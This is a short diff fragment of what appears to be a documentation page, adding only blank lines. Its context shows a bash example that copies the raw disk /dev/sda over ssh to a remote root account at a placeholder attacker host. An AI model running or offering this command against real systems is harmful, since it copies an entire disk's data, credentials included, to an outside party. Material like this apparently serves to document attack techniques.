@@ -14,3 +14,5 @@ updated_at: '2023-03-13T19:50:21.945040+00:00'
 ```bash
 dd bs=16m if=/dev/sda | ssh root@$_ATTACKER_HOST "dd bs=16M of=/dev/sdb"
 ```
+
+
